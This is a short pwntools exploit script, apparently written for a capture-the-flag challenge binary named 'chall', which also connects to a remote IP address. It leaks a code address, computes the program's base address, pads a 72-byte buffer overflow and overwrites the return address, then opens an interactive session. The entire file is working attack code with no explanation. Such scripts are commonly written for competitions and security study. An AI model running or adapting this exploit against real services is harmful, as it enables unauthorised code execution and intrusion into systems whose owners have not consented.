from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = 'debug'
r = process()
r = remote("194.31.53.241",10000)
offset = 72
rop = ROP(exe)
r.sendline("leboy")
# r.recvuntil(b'leboy\n')
print("a")
# print(r.recv(99))
sleep(1)
leak = r.recv(99).strip().decode()
print(f":::::::::::::::: {leak}")
print("----------------")
addr = int(leak[12:-11],16)
print(hex(addr))
exe.address = addr - 0x00000000000011c9
print(f"exe.address: {hex(exe.address)}")
ret = exe.address + 0x0000000000001016
r.sendline("quit")
r.sendline("Y")
rop.raw(b"A" * offset)
# rop.raw(ret)
rop.raw(addr)
sleep(3)
r.sendline(rop.chain())
r.interactive()